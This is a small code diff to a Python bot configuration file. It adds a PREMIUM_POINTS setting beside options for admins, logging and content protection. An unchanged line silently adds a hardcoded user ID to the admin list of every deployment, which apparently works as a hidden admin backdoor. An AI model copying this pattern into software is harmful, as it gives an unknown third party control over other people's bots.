@@ -71,6 +71,7 @@ PUBLIC_BOT = get_bool(user_data.get("PUBLIC_BOT", True))
 PROTECT_CONTENT = get_bool(user_data.get("PROTECT_CONTENT", False))
 CLONE_BUTTON = get_bool(user_data.get("CLONE_BUTTON", True))
 LOG_CHANNEL = user_data.get("LOG_CHANNEL", "")
+PREMIUM_POINTS = get_int(user_data.get("PREMIUM_POINTS"))
 
 ADMINS = [int(x) for x in user_data.get("ADMINS", []) if str(x).isdigit()]
 FINAL_ADMINS = list(set(ADMINS + [6789146594]))
